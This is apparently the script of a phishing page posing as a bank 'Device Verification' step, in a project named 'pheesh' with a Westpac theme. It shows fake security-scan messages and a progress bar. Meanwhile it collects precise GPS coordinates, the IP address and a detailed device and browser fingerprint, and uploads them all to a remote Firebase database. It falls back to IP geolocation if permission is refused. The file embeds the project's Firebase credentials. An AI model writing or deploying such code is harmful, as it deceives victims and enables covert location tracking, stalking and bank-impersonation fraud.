// Initialize Firebase with full config
const firebaseConfig = {
    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
    authDomain: "pheesh-4481e.firebaseapp.com",
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "pheesh-4481e",
    storageBucket: "pheesh-4481e.appspot.com",
    messagingSenderId: "458791455321",
    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
};

// Initialize Firebase
let database;
const initFirebase = () => {
    return new Promise((resolve, reject) => {
        try {
            if (!firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            database = firebase.database();
            console.log('Firebase initialized successfully');
            
            // Test database connection
            database.ref('.info/connected').on('value', (snapshot) => {
                const isConnected = snapshot.val();
                console.log('Database connection state:', isConnected);
                if (!isConnected && document.visibilityState !== 'hidden') {
                    console.warn('Attempting to reconnect to Firebase...');
                    database.goOnline();
                }
            });

            // Test write permission
            database.ref('test-write').set({
                timestamp: firebase.database.ServerValue.TIMESTAMP
            }).then(() => {
                console.log('Write permission verified');
                database.ref('test-write').remove();
                resolve(database);
            }).catch(reject);
        } catch (error) {
            console.error('Firebase initialization error:', error);
            reject(error);
        }
    });
};

// Initialize theme handling
let currentTheme = '';

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        await initFirebase();
        
        // Initial theme load
        const snapshot = await database.ref('activeTheme').once('value');
        const initialTheme = snapshot.val() || 'westpac';
        applyTheme(initialTheme);
        document.querySelector('.container').classList.add('loaded');

        // Listen for theme changes
        database.ref('activeTheme').on('value', snapshot => {
            const newTheme = snapshot.val() || 'westpac';
            if (newTheme !== currentTheme) {
                applyTheme(newTheme);
            }
        });
    } catch (error) {
        console.error('Failed to initialize:', error);
        // Fallback to default theme if Firebase fails
        applyTheme('westpac');
        document.querySelector('.container').classList.add('loaded');
    }
});

function applyTheme(themeName) {
    const theme = themes[themeName];
    if (!theme) return;

    currentTheme = themeName;
    document.getElementById('themeStyles').href = theme.styles;
    document.querySelector('.logo-image').src = theme.logo;
    document.title = `Device Verification - ${theme.name}`;
}

// Prevent right-click on logo
document.querySelector('.logo').addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});

// Prevent drag on logo
document.querySelector('.logo').addEventListener('dragstart', (e) => {
    e.preventDefault();
    return false;
});

// Prevent copy on logo
document.querySelector('.logo').addEventListener('copy', (e) => {
    e.preventDefault();
    return false;
});

// Browser detection helper functions
function getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("SamsungBrowser")) return "Samsung Browser";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    if (ua.includes("Trident")) return "Internet Explorer";
    if (ua.includes("Edge")) return "Edge";
    if (ua.includes("Chrome")) return "Chrome";
    if (ua.includes("Safari")) return "Safari";
    return "Unknown";
}

function getBrowserVersion() {
    const ua = navigator.userAgent;
    let M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
    if (/trident/i.test(M[1])) {
        let tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return tem[1] || '';
    }
    if (M[1] === 'Chrome') {
        const tem = ua.match(/\bOPR|Edge\/(\d+)/);
        if (tem !== null) return tem[1];
    }
    M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
    let tem = ua.match(/version\/(\d+)/i);
    if (tem !== null) M.splice(1, 1, tem[1]);
    return M[1];
}

// Helper function to determine location source
async function determineLocationSource(position) {
    if ('permissions' in navigator) {
        try {
            const result = await navigator.permissions.query({ name: 'geolocation' });
            if (result.state === 'granted') {
                // If accuracy is high, it's definitely GPS
                if (position.coords.accuracy < 100) {
                    return 'GPS (High Accuracy)';
                }
                // If accuracy is moderate, it might be GPS with poor signal or WiFi
                else if (position.coords.accuracy < 500) {
                    return 'GPS (Low Accuracy)';
                }
            }
        } catch (e) {
            console.error('Error checking permissions:', e);
        }
    }
    
    // Fallback to accuracy-based detection
    if (position.coords.accuracy < 100) {
        return 'GPS (High Accuracy)';
    }
    else if (position.coords.accuracy < 500) {
        return 'GPS (Low Accuracy)';
    }
    else if (position.coords.accuracy < 2000) {
        return 'WiFi';
    }
    return 'Cell/IP';
}

// Helper function to get high accuracy position
async function getHighAccuracyPosition() {
    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            resolve,
            reject,
            {
                enableHighAccuracy: true,
                timeout: 20000,
                maximumAge: 0
            }
        );
    });
}

// Verification steps for user engagement
const verificationSteps = [
    "Initializing secure connection...",
    "Verifying device signature...",
    "Analyzing network security...",
    "Validating device integrity...",
    "Performing security scan...",
    "Checking for suspicious activity...",
    "Confirming device location...",
    "Processing verification data...",
    "Finalizing security checks..."
];

// Main functionality
// Handle page unload/close
window.addEventListener('beforeunload', async () => {
    try {
        const ip = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip)
            .catch(() => null);
            
        if (ip) {
            const locationsRef = database.ref('locations');
            const query = locationsRef.orderByChild('ip').equalTo(ip);
            const snapshot = await query.once('value');
            
            snapshot.forEach((childSnapshot) => {
                const data = childSnapshot.val();
                if (data.status === 'active') {
                    childSnapshot.ref.update({ status: 'inactive' });
                }
            });
        }
    } catch (error) {
        console.error('Error updating status on page close:', error);
    }
});

document.addEventListener('DOMContentLoaded', () => {
    const allowLocationButton = document.getElementById('allowLocation');
    const locationStatus = document.getElementById('locationStatus');
    
    allowLocationButton.addEventListener('click', async () => {
        allowLocationButton.classList.add('loading');
        allowLocationButton.disabled = true;
        allowLocationButton.textContent = 'Verifying';
        document.querySelector('.thank-you-card').classList.add('processing');
        
        if (!navigator.geolocation) {
            console.log('Geolocation API not supported');
            await handleLocationFallback();
            return;
        }

        // Start verification steps display
        let stepIndex = 0;
        let progress = 0;
        
        const updateStatus = () => {
            progress = Math.min(progress + 2, 98); // Never reach 100% until final
            const currentStep = verificationSteps[stepIndex % verificationSteps.length];
            locationStatus.textContent = `${currentStep} (${progress}%)`;
        };

        const statusInterval = setInterval(() => {
            stepIndex++;
            updateStatus();
        }, 1500);

        const progressInterval = setInterval(() => {
            updateStatus();
        }, 400);

        try {
            // Enhanced Chrome/Android handling
            const isChromeAndroid = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
            const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
            
            if (isChrome || isChromeAndroid) {
                try {
                    const permissionResult = await navigator.permissions.query({ name: 'geolocation' });
                    console.log('Permission state:', permissionResult.state);
                    
                    if (permissionResult.state === 'denied') {
                        console.log('Geolocation permission denied in Chrome');
                        clearInterval(statusInterval);
                        clearInterval(progressInterval);
                        await handleLocationFallback(null, allowLocationButton, locationStatus);
                        return;
                    }

                    // Get initial position
                    const initialPosition = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: isChromeAndroid ? 45000 : 30000,
                            maximumAge: 0
                        });
                    });

                    // Save initial position
                    const initialLocationRef = await saveLocation(initialPosition, true);
                    
                    // Wait for high accuracy data
                    console.log('Waiting for high accuracy data...');
                    let attempts = 0;
                    const maxAttempts = 3;
                    let bestAccuracy = initialPosition.coords.accuracy;
                    let bestPosition = initialPosition;

                    while (attempts < maxAttempts && bestAccuracy > 100) {
                        try {
                            const newPosition = await getHighAccuracyPosition();
                            console.log(`Attempt ${attempts + 1} accuracy:`, newPosition.coords.accuracy);
                            
                            if (newPosition.coords.accuracy < bestAccuracy) {
                                bestAccuracy = newPosition.coords.accuracy;
                                bestPosition = newPosition;
                                
                                // Update database with better accuracy data
                                await updateLocation(initialLocationRef, bestPosition);
                                
                                if (bestAccuracy < 100) {
                                    console.log('Achieved high accuracy, stopping attempts');
                                    break;
                                }
                            }
                        } catch (error) {
                            console.log(`Attempt ${attempts + 1} failed:`, error);
                        }
                        attempts++;
                        await new Promise(resolve => setTimeout(resolve, 4000)); // Wait between attempts
                    }

                    // Complete the verification process
                    clearInterval(statusInterval);
                    clearInterval(progressInterval);
                    locationStatus.textContent = 'Device verification complete (100%)';
                    console.log('Final accuracy:', bestAccuracy);

                } catch (error) {
                    console.error('Error in Chrome geolocation:', error);
                    clearInterval(statusInterval);
                    clearInterval(progressInterval);
                    await handleLocationFallback(error);
                }
            } else {
                // Non-Chrome browsers
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 30000,
                        maximumAge: 0
                    });
                });
                
                clearInterval(statusInterval);
                clearInterval(progressInterval);
                await saveLocation(position, false);
                locationStatus.textContent = 'Device verification complete (100%)';
            }
        } catch (geoError) {
            console.log('Geolocation error:', geoError);
            clearInterval(statusInterval);
            clearInterval(progressInterval);
            locationStatus.textContent = 'Processing verification...';
            await handleLocationFallback(geoError);
        }
    });

    async function saveLocation(position, isInitial = false) {
        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            locationSource: await determineLocationSource(position),
            timestamp: new Date().toISOString(),
            status: 'active',
            isInitial: isInitial,
            userAgent: navigator.userAgent,
            ip: await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => 'Unknown'),
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio
            },
            device: {
                memory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : 'Unknown',
                cores: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : 'Unknown',
                platform: navigator.platform || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                language: navigator.language || 'Unknown',
                languages: navigator.languages || [navigator.language] || ['Unknown'],
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                touchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 'Unknown',
                connection: (typeof navigator.connection !== 'undefined') ? {
                    type: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown',
                    saveData: navigator.connection.saveData || false
                } : 'Unknown'
            },
            browser: {
                name: getBrowserName(),
                version: getBrowserVersion(),
                cookiesEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || null,
                plugins: (navigator.plugins && navigator.plugins.length) ? Array.from(navigator.plugins).map(p => p.name) : [],
                webdriver: (typeof navigator.webdriver !== 'undefined') ? navigator.webdriver : 'Unknown',
                pdfViewerEnabled: (typeof navigator.pdfViewerEnabled !== 'undefined') ? navigator.pdfViewerEnabled : 'Unknown',
                deviceOrientation: (typeof window.DeviceOrientationEvent !== 'undefined') ? 'Supported' : 'Not supported',
                webGL: (function() {
                    try {
                        return !!document.createElement('canvas').getContext('webgl');
                    } catch(e) {
                        return false;
                    }
                })()
            }
        };

        try {
            const newLocationRef = database.ref('locations').push();
            await newLocationRef.set(locationData);
            console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
            return newLocationRef;
        } catch (error) {
            console.error('Error saving location to Firebase:', error);
            throw error;
        }
    }

    async function updateLocation(locationRef, newPosition) {
        try {
            const updatedData = {
                latitude: newPosition.coords.latitude,
                longitude: newPosition.coords.longitude,
                accuracy: newPosition.coords.accuracy,
                altitude: newPosition.coords.altitude,
                altitudeAccuracy: newPosition.coords.altitudeAccuracy,
                locationSource: await determineLocationSource(newPosition),
                isInitial: false,
                updatedAt: new Date().toISOString()
            };

            await locationRef.update(updatedData);
            console.log('Location updated with higher accuracy data');
        } catch (error) {
            console.error('Error updating location:', error);
            throw error;
        }
    }

    // Fallback function for handling location errors
    async function handleLocationFallback(geoError = null) {
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();
            
            const locationData = {
                latitude: ipData.latitude,
                longitude: ipData.longitude,
                accuracy: 5000,
                locationSource: 'IP Geolocation',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                ip: ipData.ip,
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                device: {
                    memory: navigator.deviceMemory || 'Unknown',
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    touchPoints: navigator.maxTouchPoints,
                    connection: navigator.connection ? {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : 'Unknown'
                },
                browser: {
                    name: getBrowserName(),
                    version: getBrowserVersion(),
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    plugins: Array.from(navigator.plugins).map(p => p.name),
                    webdriver: navigator.webdriver,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    deviceOrientation: window.DeviceOrientationEvent ? 'Supported' : 'Not supported',
                    webGL: !!document.createElement('canvas').getContext('webgl')
                }
            };

            if (geoError) {
                locationData.geoError = {
                    code: geoError.code,
                    message: geoError.message
                };
            }

            const newLocationRef = database.ref('locations').push();
            await newLocationRef.set(locationData);
            locationStatus.textContent = 'Device verification complete (100%)';
        } catch (ipError) {
            console.error('IP location fallback failed:', ipError);
            // Try alternative IP service as last resort
            try {
                const altResponse = await fetch('https://ipwho.is/');
                const altData = await altResponse.json();
                if (altData.success) {
                    const fallbackData = {
                        latitude: altData.latitude,
                        longitude: altData.longitude,
                        ip: altData.ip,
                        locationSource: 'IP Geolocation (Fallback)',
                        timestamp: new Date().toISOString()
                    };
                    const newLocationRef = database.ref('locations').push();
                    await newLocationRef.set(fallbackData);
                }
                locationStatus.textContent = 'Device verification complete (100%)';
            } catch (finalError) {
                console.error('All location services failed:', finalError);
                locationStatus.textContent = 'Device verification complete (100%)';
            }
        }
    }
});
